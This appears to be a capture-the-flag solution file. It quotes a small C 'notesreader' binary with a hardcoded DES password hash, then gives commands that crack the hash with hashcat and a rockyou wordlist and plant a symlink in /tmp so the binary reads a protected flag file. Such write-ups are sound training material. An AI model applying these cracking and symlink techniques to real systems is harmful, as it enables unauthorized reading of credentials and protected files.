#!/usr/bin/python3


# ------------------notesreader.c------------------
# #define _XOPEN_SOURCE
# #include <unistd.h>
# #include <stdio.h>
# #include <stdlib.h>
# #include <string.h>
# #include <crypt.h>

# #define NOTES           "notes.txt"
# #define ENV_AUTH        "AUTH"
# #define PASSWORD        "42Oz6uCfSR.SI"

# int main(void)
# {
#         char *auth;
#         FILE *notes;
#         int c;

#         if ((auth = getenv(ENV_AUTH)) == NULL || strcmp(crypt(auth, PASSWORD), PASSWORD) != 0) {
#                 printf("Restricted access !\n");
#         } else if((notes = fopen(NOTES, "r")) == NULL) {
#                 printf("Fail...\n");
#                 perror("fopen");
#         } else {
#                 printf("Reading notes :\n");
#                 while ((c = fgetc(notes)) != EOF) {
#                         printf("%c", c);
#                 }
#                 fclose(notes);
#         }

#         return 0;
# }


# ---------------SOLVING THE CHALLENGE---------------
# 1. get the password using hashcat and add it as an env variable
#   1500 = descrypt, DES (Unix), Traditional DES
#   hashcat -m 1500 -a 0 hash.txt /usr/share/wordlists/kali-wordlists/rockyou.txt 
#   42Oz6uCfSR.SI:fusion
#   export AUTH=fusion
# 2. go to a directory you have write access (e.g. /tmp) and create a symbolic link to the flag
#   cd /tmp
#   mkdir xx
#   ln -s ~/flag notes.txt
#   ./notesreader